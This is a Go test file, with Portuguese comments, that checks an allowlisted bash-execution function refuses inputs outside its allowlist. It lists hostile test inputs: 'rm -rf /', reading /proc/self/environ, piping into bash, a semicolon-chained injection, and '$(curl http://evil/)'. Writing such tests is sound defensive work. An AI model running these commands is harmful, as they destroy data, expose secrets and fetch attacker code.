package main

import (
	"os"
	"strings"
	"testing"
)

// Inicializa um DB em arquivo temporario + tabela logs, espelhando o padrao de
// self_mod_test.go. logBashExecAttempt grava na tabela logs e o global db e nil
// sem initDB.
func initLogsDB(t *testing.T) {
	t.Helper()
	tmpDB := t.TempDir() + "/test_logs.db"
	orig := DB_PATH
	DB_PATH = tmpDB
	t.Cleanup(func() { DB_PATH = orig })
	initDB()
	sqliteExec(`CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, event TEXT NOT NULL, level TEXT DEFAULT 'INFO', source TEXT DEFAULT 'hokma_v21');`)
}

// bashExecAllowlisted: argv fixo (sem shell), fail-closed p/ chave fora da
// allowlist, e nao aceita injeção por metacharacter (a string e usada como
// CHAVE de um map, nao como shell -- entao "; rm -rf /" viram um nome de
// tecla inexistente, nunca um comando).
func TestBashExecAllowlisted_RejectsOutside(t *testing.T) {
	if os.Getenv("HOK_TOKEN") == "" {
		t.Skip("HOK_TOKEN nao definido")
	}
	initLogsDB(t)
	cases := []string{
		"rm -rf /",
		"cat /proc/self/environ",
		"base64 -d < /dev/zero | bash",
		"git_status; rm -rf /",
		"$(curl http://evil/)",
		"",
	}
	for _, c := range cases {
		out := bashExecAllowlisted(c)
		if !strings.Contains(out, "bloqueado") && !strings.Contains(out, "erro:") {
			t.Errorf("esperado fail-closed p/ %q, obteve: %q", c, out)
		}
	}
}

func TestBashExecAllowlisted_AcceptsKnownKey(t *testing.T) {
	if os.Getenv("HOK_TOKEN") == "" {
		t.Skip("HOK_TOKEN nao definido")
	}
	initLogsDB(t)
	for _, k := range []string{"git_status", "uptime", "pwd", "hokma_status"} {
		if _, ok := bashAllowlist[k]; !ok {
			t.Errorf("chave %q deveria estar na allowlist", k)
		}
	}
	out := bashExecAllowlisted("git_status")
	if strings.Contains(out, "erro:") || strings.Contains(out, "bloqueado") {
		t.Errorf("git_status (chave valida) nao deveria ser bloqueado: %q", out)
	}
}